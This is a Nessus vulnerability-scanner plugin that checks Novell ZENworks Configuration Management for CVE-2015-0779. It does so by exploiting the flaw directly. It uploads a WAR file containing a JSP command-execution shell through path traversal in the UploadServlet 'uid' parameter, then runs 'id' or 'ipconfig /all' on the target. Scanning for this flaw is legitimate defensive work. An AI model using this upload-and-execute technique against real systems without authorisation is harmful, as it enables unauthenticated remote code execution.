#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(83289);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2015-0779");
  script_bugtraq_id(73949);
  script_osvdb_id(120382);

  script_name(english:"Novell ZENworks Configuration Management < 11.3.2 Remote Code Execution (intrusive check)");
  script_summary(english:"Attempts to upload and execute web application archive.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a configuration management
application that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Novell ZENworks Configuration Management (ZCM)
running on the remote host is affected by a remote code execution
vulnerability due to improper sanitization of user-supplied input to
the 'uid' POST parameter in the /zenworks/UploadServlet script. An
unauthenticated, remote attacker can exploit this to upload and
execute arbitrary JSP code.");
  script_set_attribute(attribute:"see_also", value:"https://www.novell.com/support/kb/doc.php?id=7015776");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2015/Apr/41");
  script_set_attribute(attribute:"see_also", value:"http://download.novell.com/Download?buildid=l3sAaQ2eGb8~");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Novell ZENworks Configuration Management 11.3.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell ZENworks Configuration Management UploadServlet File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Novell ZENworks Configuration Management Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/05/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:zenworks_configuration_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "novell_zenworks_control_center_detect.nasl");
  script_require_keys("installed_sw/zenworks_control_center");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("ssh1_func.inc");
include("zip.inc");

app = "zenworks_control_center";
app_display = "Novell ZENworks Configuration Management";

deploy_time = 20; # seconds to wait for server to deploy

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443);

install = get_single_install(app_name:app, port:port);

install_dir = install["path"];

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    cmd = 'ipconfig /all';
  else
    cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";

vuln = FALSE;

foreach cmd (cmds)
{
  if (cmd == 'id')
    uid = '../../../opt/novell/zenworks/share/tomcat/webapps/';
  else
    uid = '../webapps/';

  jsp_content = '<%@ page language="java" import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("'+cmd+'");
String absPath = new java.io.File(application.getRealPath("/")).getParent();
String output= "";
String temp = null;
InputStreamReader reader = new InputStreamReader(p.getInputStream());
BufferedReader stdin = new BufferedReader(reader);

while ((temp = stdin.readLine()) != null)
{
  output += temp;
  if (temp.length() > 0) {output += "\\n";}
}

output += "\\n" + "webapps path is " + absPath + java.io.File.separator + "\\n";
%><%= output %>';

  web_xml = '<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app
PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/j2ee/dtds/web-app_2_3.dtd">

<web-app>
</web-app>';

  temp_file_name = SCRIPT_NAME - ".nasl" + "-" + unixtime();
  files = make_list2(
    make_array("name", "index.jsp", "contents", jsp_content),
    make_array("name", "WEB-INF/web.xml", "contents", web_xml)
  );
  war_file_contents = create_zip(files);
  war_file_name = temp_file_name + ".war";

  path = install_dir + "zenworks/UploadServlet?uid=" + uid + "&filename=" + war_file_name;

  res2 = http_send_recv3(
    method    : "POST",
    item      : path,
    data      : war_file_contents,
    add_headers: make_array("Content-Type", "application/octet-stream"),
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();

  sleep(deploy_time);

  verify_path = install_dir + temp_file_name  + "/index.jsp";
  res2 = http_send_recv3(
    method       : "GET",
    item         : verify_path,
    port         : port,
    exit_on_fail : TRUE
  );
  output = res2[2];

  if (output !~ cmd_pats[cmd])
    continue;

  vuln = TRUE;

  if (cmd == 'id')
    line_limit = 2;
  else
    line_limit = 10;

  get_up_path = "";
  get_path = strstr(output, "webapps path is ");
  if (!isnull(get_path))
    get_up_path = chomp(get_path) - "webapps path is ";
  break;
}

install_url = build_url(port:port, qs:install_dir);
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app_display, install_url);

request_url = build_url(port:port, qs:path);
verify_url = build_url(port:port, qs:verify_path);

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(request_url, verify_url),
  output      : chomp(output),
  rep_extra   : '\n' + 'Note that this file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted :' + '\n' +
                '\n' + get_up_path + war_file_name + '\n' +
                '\n' + 'Deleting this file will trigger the remote application server to' +
                '\n' + 'undeploy and clean up the ' + temp_file_name + ' directory.'
);
